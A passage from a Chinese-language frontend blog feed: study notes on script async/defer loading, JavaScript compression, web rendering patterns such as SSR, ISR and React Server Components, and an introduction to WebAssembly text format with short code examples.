class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>...content before script...<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://javascript.info/article/script-async-defer/long.js?speed=1&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- This isn&#x27;t visible until the script loads --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>...content after script...<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这里有一些解决办法。例如，我们可以把脚本放在页面底部。此时，它可以访问到它上面的元素，并且不会阻塞页面显示内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  ...all content is above the script...<br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://javascript.info/article/script-async-defer/long.js?speed=1&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>但是这种解决方案远非完美。例如，浏览器只有在下载了完整的 HTML文档之后才会下载该脚本（获取更多的资源）。对于长的 HTML文档来说，这样可能会造成明显的延迟。</p><p>如下例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  ...all content is above the script...<br>100000 lines omit ..........<br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://javascript.info/article/script-async-defer/long.js?speed=1&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>执行上面100000行，这时候遇到了script才去下载。有一种想法：script能不能放在前面，只是提前获取这个脚本，但是不执行，这样就不会，阻塞后续DOM的解析了。由此产生了defer：</p><p>defer：遇到脚本，先下载，但是不执行，可以想象在js单线程的场景下如何实现——队列，这些任务放在队列里[promise1,promise2]，呆到特定时机（DomContentLoaded）去执行这个队列，队列里任务的顺序和脚本出现的顺序相关，所以defer有一个优点，很好地通过手动编排script出现的顺序保证了存在依赖脚本的加载顺序。</p><p>可不可以通过并行的角度实现呢？</p><p>遇到脚本，下载的同时并执行，async就是这样的思路，每个附带async的script都是独立的一个任务，放在单独一个线程里去下下载并执行，但是这样不能保证脚本的执行顺序。</p><p>这对于使用高速连接的人来说，这不值一提，他们不会感受到这种延迟。但是这个世界上仍然有很多地区的人们所使用的网络速度很慢，并且使用的是远非完美的移动互联网连接。</p><p>幸运的是，这里有两个 <code>&lt;script&gt;</code>特性（attribute）可以为我们解决这个问题：<code>defer</code> 和<code>async</code>。</p><blockquote><p>参考：</p><p>https://zh.javascript.info/script-async-defer</p></blockquote><p>https://zhuanlan.zhihu.com/p/48521680</p><p>缓存</p><h3 id="server-push">Server push</h3><h3 id="http-itself">http itself</h3><h3 id="client">client</h3><h3id="bundle-splitting-split-your-code-into-small-reusable-pieces">Bundlesplitting: Split your code into small, reusable pieces</h3><h3 id="loading-sequence">loading sequence</h3><h3 id="performance-metrics">performance metrics</h3><h3 id="tree-shaking">tree shaking</h3><p>wip</p><h3 id="lazy-loading">lazy loading</h3><p>wip</p><h3 id="route-base-splitting">route Base Splitting</h3><p>Dynamically load components based on the current route</p><h3 id="dynamic-import-vs-static-import">Dynamic import vs staticimport</h3><ol type="1"><li><p>Static import</p></li><li><p>Dynamic import: 仅导入你需要的模块</p></li><li><p>Load non-critical components when they are visible in theviewport</p></li><li><p>Load non-critical resources when a user interacts with UIrequiring it</p></li></ol><h3 id="list-virtualization">list virtualization</h3><p>wip</p><h3 id="compression">compression:</h3><p>JavaScript is the second biggest <ahref="https://almanac.httparchive.org/en/2020/page-weight#fig-2">contributorto page size</a> and the second most <ahref="https://almanac.httparchive.org/en/2020/page-weight#fig-4">requestedweb resource</a> on the internet after images. We use patterns thatreduce the transfer, load, and execution time for JavaScript to improvewebsite performance. Compression can help reduce the time needed totransfer scripts over the network.</p><p>js是和页面大小相关的第二大重要因素(继图片之后)，压缩js可以减少传输时间</p><p>可以把压缩js和以下方法减少大js的影响：</p><ul><li><p>minification</p></li><li><p>code-splitting</p></li><li><p>bunding</p></li><li><p>caching</p></li><li><p>lazy-loading</p></li></ul><h4 id="http-compression">HTTP compression</h4><p>Compression reduces the size of documents and files, so they take upless disk space than the originals. Smaller documents consume lowerbandwidth and can be transferred over a network quickly. HTTPcompression uses this simple concept to compress website content, reduce<a href="https://almanac.httparchive.org/en/2020/page-weight">pageweights</a>, lower bandwidth requirement, and improve performance.</p><p>HTTP data compression may be categorized in different ways. One ofthem is lossy vs. lossless.</p><p><strong>Lossy compression</strong> implies that thecompression-decompression cycle results in a slightly altered documentwhile retaining its usability. The change is mostly imperceptible to theend-user. The most common example of lossy compression is JPEGcompression for images.</p><p>With <strong>Lossless compression,</strong> the data recovered aftercompression and subsequent decompression will match precisely with theoriginal. PNG images are an example of lossless compression. Losslesscompression is relevant to text transfers and should be applied totext-based formats such as HTML, CSS, and JavaScript.</p><p>Since you want all valid JS code on the browser, you should uselossless compression algorithms for JavaScript code. Before we compressthe JS, minification helps eliminate the unnecessary syntax and reduceit to only the code required for execution.</p><p><ahref="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Compression">HTTP协议中的数据压缩 - HTTP | MDN (mozilla.org)</a></p><h4 id="minification">Minification</h4><p>在压缩之前可以minify</p><p><ahref="https://web.dev/reduce-network-payloads-using-text-compression/#minification">Minification</a>complements compression by removing whitespace and any unnecessary codeto create a smaller but perfectly valid code file. When writing code, weuse line breaks, indentation, spaces, well-named variables, and commentsto improve code readability and maintainability.</p><p>Minification is a standard practice for JS and CSS optimization. It'scommon for JavaScript library developers to provide minified versions oftheir files for production deployments, usually denoted with a min.jsname extension. (e.g., <code>jquery.js</code> and<code>jquery.min.js</code>)</p><p>Multiple tools are available for <ahref="https://developers.google.com/speed/docs/insights/MinifyResources">theminification of HTML, CSS, and JS</a> resources. <ahref="https://github.com/terser-js/terser">Terser</a> is a popularJavaScript compression tool for ES6+, and <ahref="https://webpack.js.org/">Webpack</a> v4 includes a plugin for thislibrary by default to create minified build files. You can also use the<code>TerserWebpackPlugin</code> with older versions of Webpack or useTerser as a CLI tool without a module bundler.</p><h4 id="compression-1">Compression</h4><p>服务侧一般有两种压缩方式：</p><ol type="1"><li>static compression:在项目构建的时候压缩，一般压缩不常变化的静态资源，可以较高程度压缩，虽然压缩时间比较长</li><li>dynamic compression:当资源请求的时候才压缩，但是动态压缩一半压缩程度较低，因为压缩程度高，花费时间比较长，对于小型资源，也没啥优势，一般常用语动态资源。</li></ol><h4 id="压缩算法">压缩算法：</h4><ol type="1"><li><p>Gzip</p><p>The Gzip compression format has been around for almost 30 years andis a lossless algorithm based on the <ahref="https://www.youtube.com/watch?v=whGwm0Lky2s&amp;t=851s">Deflatealgorithm</a>. The deflate algorithm itself uses a combination of the <ahref="https://cs.stanford.edu/people/eroberts/courses/soco/projects/data-compression/lossless/lz77/algorithm.htm">LZ77algorithm</a> and <ahref="https://cs.stanford.edu/people/eroberts/courses/soco/projects/data-compression/lossless/huffman/algorithm.htm">Huffmancoding</a> on blocks of data in an input data stream.</p><p>The LZ77 algorithm identifies duplicate strings and replaces themwith a backreference, which is a pointer to the place where itpreviously appeared, followed by the length of the string. Subsequently,Huffman coding identifies the commonly used references and replaces themwith references with shorter bit sequences. Longer bit sequences areused to represent infrequently used references.</p><p>All major browsers support Gzip. The <ahref="https://github.com/google/zopfli">Zopfli</a> compression algorithmis a slower but improved version of Deflate/Gzip, producing smaller GZipcompatible files. It is most suitable for static compression, where itcan provide more significant gains.</p></li></ol><figure><imgsrc="https://www.patterns.dev/_next/image?url=%2Fimg%2Fcompression%2Fcompressingjav--zhfjmtap05.png&amp;w=3840&amp;q=75"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><ol start="2" type="1"><li>Brotli</li></ol><h4 id="check-compression">Check Compression</h4><p>Chrome -&gt; DevTools -&gt; network -&gt; Headers. DevTools displaysthe content-encoding used in the response, as shown below.</p><figure><imgsrc="https://www.patterns.dev/_next/image?url=%2Fimg%2Fcompression%2Fcompressingjav--4gwntp0et8s.png&amp;w=3840&amp;q=75"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>The lighthouse report includes a performance audit for "Enable TextCompression" that checks for text-based resource types received withoutthe content-encoding header set to ‘br', ‘gzip' or ‘deflate'. Lighthouseuses Gzip to compute the potential savings for the resource.</p><figure><imgsrc="https://www.patterns.dev/_next/image?url=%2Fimg%2Fcompression%2Fcompressingjav--qmwdq1rskk8.png&amp;w=3840&amp;q=75"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h4 id="trade-off">trade off</h4><ol type="1"><li><p>gain(1+2) &gt;= gain(1) + gain(2):放在一起压缩的收益比分开压缩的收益更好</p><p>Limited local data suggests a 5% to 10% loss for smaller chunks. Theextreme case of unbundled chunks shows a 20% increase in size.Additional IPC, I/O, and processing costs are attached to each chunkthat gets shared in the case of larger chunks. The v8 engine has a 30Kstreaming/parsing threshold. This means that all chunks smaller than 30Kwill parse on the critical loading path even if it isnon-critical.</p></li><li><p>但是分开压缩对缓存有好处：</p><ol type="1"><li>如果某个资源发生改变，分开压缩的模块的情况下只需要重新获取对应的最新资源即可；但是如果是大文件压缩，则需要重新获取整个资源；</li><li>另外，按需加载的情况下，我们也是尽可能只需要尽量小的资源，如果整个都压缩在一起了，势必也会不好，下载了很多无用的部分</li></ol></li></ol><p>As a result of this trade-off, the maximum number of chunks usedtoday by most production apps is around 10. This limit needs to beincreased to support better caching and de-duplication for apps withlarge amounts of JavaScrip</p><h2 id="render-patterns">Render Patterns</h2><p>UX friendly</p><p><img src="https://www.patterns.dev/_next/image?url=https%3A%2F%2Fres.cloudinary.com%2Fddxwdqwkr%2Fimage%2Fupload%2Ff_auto%2Fv1660456914%2Fpatterns.dev%2Fweb-vitals.png&w=3840&q=75" alt="img" style="zoom: 25%;" /></p><p>DX friendly</p><figure><imgsrc="https://www.patterns.dev/_next/image?url=https%3A%2F%2Fres.cloudinary.com%2Fddxwdqwkr%2Fimage%2Fupload%2Ff_auto%2Fv1658990025%2Fpatterns.dev%2F5.png&amp;w=3840&amp;q=75"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>trade off:</p><figure><imgsrc="https://www.patterns.dev/_next/image?url=https%3A%2F%2Fres.cloudinary.com%2Fddxwdqwkr%2Fimage%2Fupload%2Ff_auto%2Fv1658990025%2Fpatterns.dev%2F6.png&amp;w=3840&amp;q=75"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>The Chrome team <ahref="https://developers.google.com/web/updates/2019/02/rendering-on-the-web">hasencouraged</a> developers to consider static or server-side renderingover a full rehydration approach. Over time, progressive loading andrendering techniques, by default, may help strike a good balance ofperformance and feature delivery when using a modern framework.</p><h3 id="static-rendering">static Rendering</h3><ul><li>项目build的html就生成好了，直到下一次build之前都不会发生改变，所以页面比较死板</li><li>速度特别快</li><li>cdn缓存策略加速用户访问</li><li>适合不常改变的幂等性网页(不论怎么请求结果都是一样的)</li><li>不存在re-layout and repainting</li></ul><p>https://res.cloudinary.com/dq8xfyhu4/video/upload/l_logo_pke9dv,o_52,x_-1510,y_-900/ac_none/v1609691928/CS%20Visualized/Screen_Recording_2022-05-05_at_10.18.37_AM_bhybvb.webm</p><h3 id="static-rendering-with-client">static Rendering with client</h3><ul><li>改变了static rendering的非动态数据的特点，允许请求动态数据</li><li>同时为例避免re-layout andrepainting，使用了骨架屏方案，防止数据渲染的时候引起UI变动；</li><li>但是骨架屏的大小要准确</li><li>给予了服务器压力，因为现在要实时获取数据了，每一个请求都需要server侧回应</li></ul><p>https://res.cloudinary.com/dq8xfyhu4/video/upload/l_logo_pke9dv,o_52,x_-1510,y_-900/ac_none/v1609691928/CS%20Visualized/Screen_Recording_2022-05-05_at_2.55.30_PM_r0jvez.webm</p><h3 id="static-with-getstaticprops">static with getStaticProps</h3><ul><li>在build时期就可以动态的去获取数据，减少了一部分在客户端的请求</li><li>但是这些请求与用户互关(not user-specific)</li><li>但是如果这样的请求过多的话，build时间很能会很长</li><li>这种方法也只适用于在构建时不经常更新数据的情况</li></ul><p>https://res.cloudinary.com/dq8xfyhu4/video/upload/l_logo_pke9dv,o_52,x_-1510,y_-900/ac_none/v1609691928/CS%20Visualized/Screen_Recording_2022-05-05_at_3.06.26_PM_djvt57.webm</p><h3 id="incremental-sattic-regeneration">Incremental satticregeneration</h3><p>对于上面build time的问题(static with getStaticProps)和动态数据(staticRendering with client)的问题，可以使用这个方法解决</p><ul><li>和前面的思路不一样，之前是build的时候一次性产生所有静态资源，而现在是请求一个html，就重新生成一个（有优先从缓存里取），一般配合servelessfunction一起使用（减少了build time），数据仍然是在server侧生成的</li><li>不需要build，但是似乎需要重新部署到cdn，为了避免重新部署，定时校验静态资源缓存</li><li>Thus, only the first user is likely to have a poorer experience forpages that are not pre-rendered.</li></ul><p>https://res.cloudinary.com/dq8xfyhu4/video/upload/l_logo_pke9dv,o_52,x_-1510,y_-900/ac_none/v1609691928/CS%20Visualized/Screen_Recording_2022-05-05_at_3.49.59_PM_deygni.webm</p><p>https://res.cloudinary.com/dq8xfyhu4/video/upload/l_logo_pke9dv,o_52,x_-1510,y_-900/ac_none/v1609691928/CS%20Visualized/updated_jvhqnv.webm</p><h3 id="on-demand-incremental-sattic-regeneration">On-demand Incrementalsattic regeneration</h3><ul><li><p>not user-specific</p></li><li><p>不是定时更新cdn，而是基于特定事件</p></li></ul><h3 id="ssr">SSR</h3><p>With server-side rendering, we generate the HTML for every request.This approach is most suitable for pages containing highly personalizeddata, for example, data based on the user cookie or generally any dataobtained from the user's request. It's also suitable for pages thatshould be render-blocking, perhaps based on authentication state.</p><ul><li>可以和csr一样包含了user-specific data</li><li>use request-based data, like cookie</li><li>should be render-blocking</li><li>The time it takes to start up the lambda, known as the long coldboot, is a common issue with serverless functions. Also, connections todatabases can be slow. You should also not call a serverless functionlocated on one side of the planet from the other.</li><li>server侧压力大了，优化方法：<ul><li><strong>Deploy databases in the same region as your serverlessfunction</strong>：减少查询时间</li><li><strong>Execution time of<code>getServerSideProp</code></strong>：The page generation does notstart until the data from <code>getServerSideProps</code> is available.Hence, we must ensure that the <code>getServerSideProps</code> methoddoesn't run too long.</li><li><strong>Add <code>Cache-control</code> headers toresponses</strong></li><li><strong>Upgrade server hardware</strong></li></ul></li></ul><p>https://res.cloudinary.com/dq8xfyhu4/video/upload/l_logo_pke9dv,o_52,x_-1510,y_-900/ac_none/v1609691928/CS%20Visualized/Screen_Recording_2022-05-05_at_5.31.41_PM_oxsq12.webm</p><h3 id="csr">CSR</h3><p><模板 js执行的逻辑会挂在这个节点下面></p><script><p>如果这的逻辑很长或者下载该脚本及其依赖脚本时间过长，就会导致白屏</p><p>SSR:</p><p>实际上SSR的一定有的结构如下：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;root&#x27;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><span class="hljs-template-variable">&#123;renderToHtml(content)&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;client.js&#x27;</span> /&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></span></span><br></code></pre></td></tr></table></figure><p>把server侧的整个html交给了客户侧的js管理，但是这样每次请求一个新页面，就会重新刷新一次，它的粒度不够细，RSC可以解决这个问题。</p><p>关于SSR的实践的几个点：</p><ul><li>同构是什么？server无法处理的一些事情，如事件绑定交给客户端</li><li>客户端和server侧同步store，为什么要同步呢？</li><li>路由的问题：如果要使用局部刷新的话，ssr要写两份路由，一份是客户端的路由，一份是对应的服务端路由</li></ul><p>SSR的实践：</p><p><a href="https://juejin.cn/post/7065303971723739144">React SSR初实践（一） - 掘金 (juejin.cn)</a></p><h3 id="react-server-component">React Server Component</h3><p>一句话来说：RSC可以使得客户端的React树既有客户端组建也有服务端组件，所以整个React树是可以实现局部刷新的</p><p><a href="https://juejin.cn/post/6931902782131666951#heading-7">ReactServer Components到底行不行？ - 掘金 (juejin.cn)</a></p><p><a href="https://zhuanlan.zhihu.com/p/470449193">React servercomponent 深入指南 - 知乎 (zhihu.com)</a></p><h3 id="http-streaming">HTTP streaming</h3><p>[普通的请求结果：0 or 1，stream：随时使用，挤牙膏]</p><p>With Edge SSR, we can stream parts of the document as soon as they'reready and hydrate these components granularly. This reduces the waitingtime for users as they can see components as they stream in one byone.</p><p>https://res.cloudinary.com/dq8xfyhu4/video/upload/l_logo_pke9dv,o_52,x_-1510,y_-900/ac_none/v1609691928/CS%20Visualized/Screen_Recording_2022-05-05_at_5.48.20_PM_auurip.webm</p><p>结合：静态数据网页static rendering，user-specific serverrendering</p><p><a href="https://zhuanlan.zhihu.com/p/98848420">从 Fetch 到 Streams—— 以流的角度处理网络请求 - 知乎 (zhihu.com)</a></p><h3 id="some-ideas-in-reacting">Some ideas in Reacting</h3><h3 id="关于react性能优化">关于React性能优化</h3><h3 id="关于写组件的一些体会">关于写组件的一些体会</h3><p>headless UI:无UI组件，表示仅提供UI元素和交互的数据状态逻辑，但不提供标记(html元素)，样式</p><p>暴露状态和一些控制逻辑给用户？</p><p>但是状态在内部，用户不需要管，以及控制该状态的api也已经给用户了，具体如何使用该api控制该状态，进而控制UI全权交给了用户</p><p>https://www.patterns.dev/posts/hoc-pattern</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/emocoder/2023/06/29/%E4%BD%95%E4%B8%BAwasm%EF%BC%9F/"/>
    <url>/emocoder/2023/06/29/%E4%BD%95%E4%B8%BAwasm%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h2 id="何为wasm">何为wasm？</h2><p>WebAssembly 是一种新的编码方式，可以在现代的网络浏览器中运行 －它是一种低级的类汇编语言，具有紧凑的二进制格式，可以接近原生的性能运行，<strong>并为诸如C / C ++等语言提供一个编译目标</strong>，以便它们可以在 Web上运行。它也被设计为可以<strong>与 JavaScript共存</strong>，允许两者一起工作。</p><p>对于网络平台而言，WebAssembly 具有巨大的意义——这为客户端 app提供了一种在网络平台以接近本地速度的方式运行多种语言编写的代码的方式；在这之前，客户端app 是不可能做到的。</p><p>WebAssembly 被设计为可以和 JavaScript 一起协同工作——通过使用WebAssembly 的 JavaScript API，你可以把 WebAssembly 模块加载到一个JavaScript 应用中并且在两者之间共享功能。这允许你在同一个应用中利用WebAssembly 的性能和威力以及 JavaScript的表达力和灵活性，即使你可能并不知道如何编写 WebAssembly 代码。</p><p><strong>webassembly的目标</strong></p><ul><li>快速、高效、可移植</li><li>WebAssembly是一门低阶语言，但是它有确实有一种人类可读的文本格式（wat格式），这允许通过手工来写代码，看代码以及调试代码。</li><li>保持安全——WebAssembly被限制运行在一个安全的沙箱执行环境中。像其他网络代码一样，它遵循浏览器的同源策略和授权策略</li><li>不破坏网络——WebAssembly的设计原则是与其他网络技术和谐共处并保持向后兼容</li></ul><p>webassembly如何适应网络平台，从两方面入手：</p><ul><li>提供运行时宿主环境：vm</li><li>可以使用网络平台的一些api：如DOM, CSSOM, WebGL, IndexDB,WebAudio</li></ul><h2 id="前景和发展有什么用">前景和发展，有什么用？</h2><h2 id="原理大致怎么做的">原理，大致怎么做的？</h2><h3 id="常规使用方式">常规使用方式</h3><p>(使用基于llvm的语言)如C++编写程序 =&gt; 借用编译工具(Emscripten)=&gt; wassm格式的代码 =&gt; 用来加载和运行该模块的JavaScript”胶水“代码</p><figure><imgsrc="https://developer.mozilla.org/en-US/docs/WebAssembly/Concepts/emscripten-diagram.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><ol type="1"><li>Emscripten 首先把 C/C++提供给 clang+LLVM——一个成熟的开源C/C++编译器工具链，比如，在 OSX 上是 XCode 的一部分。</li><li>Emscripten 将 clang+LLVM 编译的结果转换为一个.wasm 二进制文件。</li><li>就自身而言，WebAssembly 当前不能直接的存取 DOM；它只能调用JavaScript，并且只能传入整形和浮点型的原始数据类型作为参数。这就是说，为了使用任何Web API，WebAssembly 需要调用到 JavaScript，然后由 JavaScript 调用 WebAPI。因此，Emscripten 创建了 HTML 和 JavaScript胶水代码以便完成这些功能。</li></ol><h3 id="直接写wasm">直接写wasm</h3><p>就像真实的汇编语言一样，WebAssembly的二进制格式也有文本表示——两者之间 1:1对应。你可以手工书写或者生成这种格式然后使用这些工具（<ahref="http://webassembly.org/getting-started/advanced-tools/">WebAssembytext-to-binary tools</a>）中的任何一个把它转换为二进制格式。</p><h3 id="wasm基本概念">wasm基本概念</h3><p>其实上面提到了js作为胶水代码，那必然有相关的概念，</p><p>模块：</p><p>内存：</p><p>表格：</p><p><strong>实例</strong>：</p><h2 id="wasm基本概念-1">wasm基本概念</h2><h3 id="c-wassm">C++ =&gt; wassm</h3><p>Wassm: 机器理解的语言</p><p>wat: 人可理解的wassm</p><p>wassm可以通过一些工具（）转为人可阅读的一段文本，这段文本是树状的表达式，类似抽象语法树(AST)，树里的每个节点都是用括号括起来的，并且每个节点都有自己的标记，代表属于语言的某一部分（是函数？还是参数？等等），而没有用括号包裹的一般都是operation，如下：</p><figure class="highlight wasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs wasm"><span class="hljs-punctuation">(</span><span class="hljs-keyword">func</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">param</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">param</span> <span class="hljs-type">f32</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">local</span> <span class="hljs-type">f64</span><span class="hljs-punctuation">)</span><br>  <span class="hljs-keyword">local.get</span> <span class="hljs-number">0</span><br>  <span class="hljs-keyword">local.get</span> <span class="hljs-number">1</span><br>  <span class="hljs-keyword">local.get</span> <span class="hljs-number">2</span><span class="hljs-punctuation">)</span><br></code></pre></td></tr></table></figure><p>这是一个函数节点，函数节点包含3个子节点（2个参数节点和一个局部变量节点，参数的标记是param，局部变量1的标记是local），并且还有3个operation（下面会提到一些基本的operation）。</p><p>常见节点：</p><figure class="highlight wasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs wasm"><span class="hljs-keyword">module</span><br><span class="hljs-keyword">param</span><br><span class="hljs-keyword">result</span><br><span class="hljs-keyword">export</span>: <span class="hljs-punctuation">(</span><span class="hljs-keyword">export</span> <span class="hljs-string">&quot;add&quot;</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">func</span> <span class="hljs-title function_">$add</span><span class="hljs-punctuation">))</span>, 导出函数<span class="hljs-variable">$add</span>, 暴露对外部语言的一个接口：add，简写方式：在定义函数的时候即刻导出<br><br><span class="hljs-keyword">import</span>: <span class="hljs-punctuation">(</span><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;console&quot;</span> <span class="hljs-string">&quot;log&quot;</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">func</span> <span class="hljs-title function_">$log</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">param</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">)))</span>, wassm提供了二级命名空间，如这里的console.log，代表的是即将导入的外部语言的console模块下的log变量，后面<span class="hljs-keyword">func</span> <span class="hljs-title function_">$log</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">param</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">)</span>是导入函数的签名，必须要和原语言的类型一致，对于js这种语言其实不起作用。<br>WebAssembly has a two-level namespace so the <span class="hljs-keyword">import</span> statement here is saying that we&#x27;re asking to <span class="hljs-keyword">import</span> the log function from the console module. <br><br>Imported functions are just like normal functions: they have a signature that WebAssembly validation checks statically, and they are given an index and can be named and called.<br><br>JavaScript functions have no notion of signature, so any JavaScript function can be passed, regardless of the <span class="hljs-keyword">import</span>&#x27;s declared signature. （会忽略js的函数签名）<br><br>Once a <span class="hljs-keyword">module</span> declares an <span class="hljs-keyword">import</span>, the caller of WebAssembly.instantiate<span class="hljs-punctuation">()</span> must pass in an <span class="hljs-keyword">import</span> object that has the corresponding properties.<br></code></pre></td></tr></table></figure><p>operation：</p><p>read：</p><p>​ 按索引读（其实就是按照函数栈内的偏移量读）：The instruction<code>local.get 0</code> would get the i32 parameter,<code>local.get 1</code> would get the f32 parameter, and<code>local.get 2</code> would get the f64 local.</p><p>​ 具名读：write <code>local.get $p1</code> instead of<code>local.get 0</code>, etc</p><p>​具名读速度应该会慢点，只是方便开发人员阅读，因为最终还是要转成机器可理解的方式</p><p>write：</p><p>常见opertaion</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crystal">call <span class="hljs-variable">$&#123;</span>name&#125;<br><span class="hljs-variable">$&#123;</span><span class="hljs-keyword">type</span>&#125;.const <br></code></pre></td></tr></table></figure><p>在讲write操作之前，讨论关于函数的计算模型——堆栈机，因为write操作比较抽象，就是一条简单的指令；</p><p>来看写操作：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-type">i32</span>.<span class="hljs-keyword">add</span><br></code></pre></td></tr></table></figure><p>表示基于i32类型的，从栈内取出两个数字相加并放回栈内</p><blockquote><p>如果类型不对会怎么样？</p></blockquote><p>在js里使用wassm（涉及相关api，memory，global）</p><p>在wassm里使用js或者其他语言（涉及导入声明和instance传入的一个对象）</p><p><strong>全局变量</strong></p><p>WebAssembly has the ability to create global variable instances,accessible from both JavaScript and importable/exportable across one ormore <ahref="https://developer.mozilla.org/en-US/docs/WebAssembly/JavaScript_interface/Module"><code>WebAssembly.Module</code></a>instances. This is very useful, as it allows dynamic linking of multiplemodules.</p><p>wassm可以创建全局变量，这些变量可以来自js或者可导入/导出的<ahref="https://developer.mozilla.org/en-US/docs/WebAssembly/JavaScript_interface/Module"><code>WebAssembly.Module</code></a>instances。</p><figure class="highlight wasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs wasm"><span class="hljs-punctuation">(</span><span class="hljs-keyword">module</span><br>   <span class="hljs-punctuation">(</span><span class="hljs-keyword">global</span> <span class="hljs-variable">$g</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;js&quot;</span> <span class="hljs-string">&quot;global&quot;</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">mut</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">))</span> // 声明来自js的全局变量<br>   <span class="hljs-punctuation">(</span><span class="hljs-keyword">func</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">export</span> <span class="hljs-string">&quot;getGlobal&quot;</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">result</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">)</span> // 函数<span class="hljs-number">1</span><br>        <span class="hljs-punctuation">(</span><span class="hljs-keyword">global.get</span> <span class="hljs-variable">$g</span><span class="hljs-punctuation">))</span><br>   <span class="hljs-punctuation">(</span><span class="hljs-keyword">func</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">export</span> <span class="hljs-string">&quot;incGlobal&quot;</span><span class="hljs-punctuation">)</span>// 函数<span class="hljs-number">2</span>，导出<br>        <span class="hljs-punctuation">(</span><span class="hljs-keyword">global.set</span> <span class="hljs-variable">$g</span><br>            <span class="hljs-punctuation">(</span><span class="hljs-keyword">i32.add</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">global.get</span> <span class="hljs-variable">$g</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">(</span><span 